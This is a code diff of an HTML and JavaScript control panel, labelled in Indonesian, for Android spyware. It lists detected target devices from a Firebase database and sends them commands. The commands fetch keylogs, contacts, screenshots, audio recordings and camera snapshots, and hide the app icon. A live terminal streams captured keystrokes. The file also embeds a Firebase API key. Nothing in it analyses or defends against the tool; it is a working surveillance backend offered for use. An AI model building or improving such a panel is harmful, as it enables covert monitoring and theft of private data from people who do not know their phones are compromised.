@@ -3,45 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZETA ULTIMATE CONTROL</title>
+    <title>ZETA ULTIMATE CONTROL V3.5</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <style>
-        :root { --bg: #05070a; --card: #111827; --accent: #3b82f6; --text: #f3f4f6; }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; }
-        #sidebar { background: #000; width: 100%; padding: 15px; border-bottom: 2px solid var(--accent); }
-        #device-list { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 10px; }
-        .dev-item { background: var(--card); padding: 10px; border-radius: 8px; cursor: pointer; border: 1px solid #374151; min-width: 150px; }
-        .dev-item.active { border-color: var(--accent); background: #1e3a8a; }
-        main { flex: 1; padding: 15px; overflow-y: auto; }
-        .grid-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
-        .card { background: var(--card); padding: 15px; border-radius: 12px; border: 1px solid #1f2937; margin-bottom: 15px; }
-        .label { font-size: 10px; font-weight: 800; color: #6b7280; text-transform: uppercase; margin-bottom: 10px; display: block; }
-        button { background: #374151; color: white; border: none; padding: 12px 5px; border-radius: 6px; cursor: pointer; font-size: 11px; transition: 0.2s; font-weight: 600; }
-        button:hover { background: #4b5563; }
-        button:active { transform: scale(0.95); }
-        .btn-danger { background: #991b1b; }
-        .btn-safe { background: #065f46; }
-        #terminal { background: #000; color: #10b981; padding: 10px; height: 200px; border-radius: 8px; font-family: monospace; overflow-y: auto; font-size: 11px; border: 1px solid #374151; }
+        :root { --bg: #05070a; --card: #111827; --accent: #3b82f6; --text: #f3f4f6; --green: #10b981; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        
+        /* Sidebar */
+        #sidebar { background: #000; width: 100%; padding: 15px; border-bottom: 2px solid var(--accent); overflow-y: auto; }
+        .brand { color: var(--accent); font-weight: 900; font-size: 20px; margin-bottom: 15px; text-align: center; }
+        
+        /* Device List Styling */
+        #device-list { display: flex; flex-direction: column; gap: 10px; }
+        .dev-item { 
+            background: var(--card); padding: 15px; border-radius: 10px; 
+            cursor: pointer; border: 2px solid #1f2937; transition: 0.3s; 
+            position: relative; overflow: hidden;
+        }
+        .dev-item:hover { background: #1f2937; border-color: var(--gray); }
+        .dev-item.active { border-color: var(--accent); background: #1e3a8a; box-shadow: 0 0 15px rgba(59, 130, 246, 0.4); }
+        .dev-item b { font-size: 14px; display: block; margin-bottom: 4px; color: #fff; }
+        .dev-item small { font-size: 11px; color: #9ca3af; font-family: monospace; }
+        
+        /* Main Content */
+        main { flex: 1; padding: 20px; overflow-y: auto; background: #080c14; }
+        .grid-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+        .card { background: var(--card); padding: 15px; border-radius: 12px; border: 1px solid #1f2937; margin-bottom: 20px; }
+        .label { font-size: 11px; font-weight: 800; color: #6b7280; text-transform: uppercase; margin-bottom: 12px; display: block; border-left: 3px solid var(--accent); padding-left: 8px; }
+        
+        /* Buttons */
+        button { background: #374151; color: white; border: none; padding: 12px 5px; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: 600; transition: 0.2s; }
+        button:hover { background: #4b5563; filter: brightness(1.2); }
+        button:active { transform: translateY(2px); }
+        .btn-danger { background: #b91c1c; }
+        .btn-safe { background: #059669; }
+
+        /* Terminal */
+        #terminal { background: #000; color: var(--green); padding: 15px; height: 250px; border-radius: 8px; font-family: 'Consolas', monospace; overflow-y: auto; font-size: 12px; border: 1px solid #374151; line-height: 1.6; }
+        .log-entry { border-bottom: 1px solid #111; padding: 4px 0; }
+
         @media (min-width: 768px) {
             body { flex-direction: row; }
-            #sidebar { width: 300px; height: 100vh; border-bottom: none; border-right: 1px solid var(--accent); }
-            #device-list { flex-direction: column; }
+            #sidebar { width: 320px; height: 100vh; border-bottom: none; border-right: 1px solid #1f2937; }
         }
     </style>
 </head>
 <body>
 
 <div id="sidebar">
-    <div style="color:var(--accent); font-weight:900; margin-bottom:20px;">ZETA V3.5 CONTROL</div>
-    <div class="label">Online Devices</div>
-    <div id="device-list">Connecting...</div>
+    <div class="brand">ZETA ULTIMATE</div>
+    <span class="label">Target Terdeteksi</span>
+    <div id="device-list">Mencari perangkat...</div>
 </div>
 
 <main>
-    <div id="panel" style="display:none;">
+    <div id="no-selection" style="text-align: center; margin-top: 100px; color: #4b5563;">
+        <h2>⚠️ Perangkat Belum Dipilih</h2>
+        <p>Silakan klik pada salah satu list perangkat di sebelah kiri/atas.</p>
+    </div>
+
+    <div id="panel-control" style="display:none;">
         <div class="card">
-            <span class="label">System Navigation (7)</span>
+            <span class="label">🕹️ Navigasi & Sistem</span>
             <div class="grid-container">
                 <button onclick="sendCmd('home')">🏠 HOME</button>
                 <button onclick="sendCmd('back')">⬅️ BACK</button>
@@ -54,7 +78,7 @@
         </div>
 
         <div class="card">
-            <span class="label">Media & Volume (8)</span>
+            <span class="label">🔊 Media & Volume</span>
             <div class="grid-container">
                 <button onclick="sendCmd('vol_up')">🔊 VOL UP</button>
                 <button onclick="sendCmd('vol_down')">🔉 VOL DOWN</button>
@@ -68,7 +92,7 @@
         </div>
 
         <div class="card">
-            <span class="label">Apps & Data (10)</span>
+            <span class="label">📂 Data & Aplikasi</span>
             <div class="grid-container">
                 <button class="btn-safe" onclick="sendCmd('get_logs')">📥 AMBIL KEYLOG</button>
                 <button class="btn-safe" onclick="sendCmd('get_contact')">👤 GET CONTACT</button>
@@ -84,7 +108,7 @@
         </div>
 
         <div class="card">
-            <span class="label">Security & Stealth (10)</span>
+            <span class="label">🛡️ Keamanan & Eksekusi</span>
             <div class="grid-container">
                 <button class="btn-danger" onclick="sendCmd('hide_icon')">👻 HIDE ICON</button>
                 <button class="btn-danger" onclick="sendCmd('show_icon')">👁️ SHOW ICON</button>
@@ -94,19 +118,20 @@
                 <button onclick="sendCmd('screenshot')">📸 SCREENSHOT</button>
                 <button onclick="sendCmd('record_audio')">🎙️ REC AUDIO</button>
                 <button onclick="sendCmd('camera_snap')">📷 CAM SNAP</button>
-                <button class="btn-danger" onclick="clearLogs()">🗑️ CLEAR DB LOGS</button>
+                <button class="btn-danger" onclick="clearLogsData()">🗑️ CLEAR DB LOGS</button>
                 <button onclick="location.reload()">🔄 REFRESH PANEL</button>
             </div>
         </div>
 
         <div class="card">
-            <span class="label">Live Terminal Output</span>
-            <div id="terminal">Select a device to see logs...</div>
+            <span class="label">⌨️ Live Keylogs Terminal</span>
+            <div id="terminal">Menunggu perintah...</div>
         </div>
     </div>
 </main>
 
 <script>
+    // KONFIGURASI FIREBASE
     const firebaseConfig = {
         apiKey: "AIzaSyDrpBJTtankyLgimtOwuriFpiyuC5K10OI",
         authDomain: "studio-727777898-40aea.firebaseapp.com",
@@ -122,39 +147,89 @@
     const db = firebase.database();
     let selectedId = "";
 
+    // MENGAMBIL LIST PERANGKAT
     db.ref('daftar_perangkat').on('value', snap => {
         const list = document.getElementById('device-list');
         list.innerHTML = "";
+        
+        if(!snap.exists()) {
+            list.innerHTML = "<div style='color:gray;padding:10px;'>Tidak ada perangkat online.</div>";
+            return;
+        }
+
         snap.forEach(child => {
             const id = child.key;
-            const info = child.val().info || {};
-            const item = document.createElement('div');
-            item.className = `dev-item ${selectedId === id ? 'active' : ''}`;
-            item.innerHTML = `<b>${info.model || 'Unknown'}</b><br><small>${id}</small>`;
-            item.onclick = () => { selectedId = id; document.getElementById('panel').style.display='block'; listenLogs(id); };
-            list.appendChild(item);
+            const data = child.val().info || {};
+            const model = data.model || "Unknown Device";
+            
+            const div = document.createElement('div');
+            div.className = `dev-item ${selectedId === id ? 'active' : ''}`;
+            div.innerHTML = `<b>📱 ${model}</b><small>ID: ${id}</small>`;
+            
+            // FITUR KLIK PERBAIKAN
+            div.onclick = function() {
+                handleDeviceSelection(id);
+            };
+            
+            list.appendChild(div);
         });
     });
 
-    function sendCmd(c) {
-        if(!selectedId) return alert("Select Device!");
-        db.ref(`daftar_perangkat/${selectedId}`).update({ command: c, time: Date.now() });
+    function handleDeviceSelection(id) {
+        selectedId = id;
+        
+        // Tampilkan UI Control
+        document.getElementById('no-selection').style.display = 'none';
+        document.getElementById('panel-control').style.display = 'block';
+        
+        // Update styling di sidebar
+        const items = document.querySelectorAll('.dev-item');
+        items.forEach(item => {
+            if(item.innerHTML.includes(id)) {
+                item.classList.add('active');
+            } else {
+                item.classList.remove('active');
+            }
+        });
+
+        // Hubungkan ke Log
+        listenToLiveLogs(id);
     }
 
-    function listenLogs(id) {
-        db.ref(`daftar_perangkat/${id}/keylogs`).limitToLast(20).on('value', snap => {
-            const term = document.getElementById('terminal');
+    function sendCmd(commandName) {
+        if(!selectedId) {
+            alert("Pilih perangkat terlebih dahulu!");
+            return;
+        }
+        db.ref(`daftar_perangkat/${selectedId}`).update({
+            command: commandName,
+            time: Date.now()
+        }).then(() => {
+            console.log("Sent: " + commandName);
+        });
+    }
+
+    function listenToLiveLogs(id) {
+        const term = document.getElementById('terminal');
+        db.ref(`daftar_perangkat/${id}/keylogs`).limitToLast(30).on('value', snap => {
             term.innerHTML = "";
+            if(!snap.exists()) {
+                term.innerHTML = "<div style='color:#4b5563'>Belum ada data log dari perangkat ini.</div>";
+                return;
+            }
             snap.forEach(child => {
-                const l = child.val();
-                term.innerHTML += `<div>[${new Date(l.time).toLocaleTimeString()}] ${l.text}</div>`;
+                const data = child.val();
+                const time = new Date(data.time).toLocaleTimeString();
+                term.innerHTML += `<div class="log-entry"><span style="color:#3b82f6">[${time}]</span> ${data.text}</div>`;
             });
             term.scrollTop = term.scrollHeight;
         });
     }
 
-    function clearLogs() {
-        if(selectedId && confirm("Delete logs?")) db.ref(`daftar_perangkat/${selectedId}/keylogs`).remove();
+    function clearLogsData() {
+        if(selectedId && confirm("Hapus semua log di database untuk perangkat ini?")) {
+            db.ref(`daftar_perangkat/${selectedId}/keylogs`).remove();
+        }
     }
 </script>
 </body>
